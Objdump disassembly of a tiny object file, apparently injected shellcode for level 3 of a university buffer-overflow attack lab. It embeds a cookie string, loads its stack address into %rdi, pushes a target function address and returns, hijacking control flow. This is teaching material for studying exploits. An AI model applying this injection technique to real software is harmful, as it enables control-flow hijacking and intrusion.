
clevel3.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	34 37                	xor    $0x37,%al
   2:	64 62                	fs (bad) 
   4:	34 65                	xor    $0x65,%al
   6:	33 61 00             	xor    0x0(%rcx),%esp
   9:	48 c7 c7 78 27 65 55 	mov    $0x55652778,%rdi
  10:	68 48 19 40 00       	pushq  $0x401948
  15:	c3                   	retq   
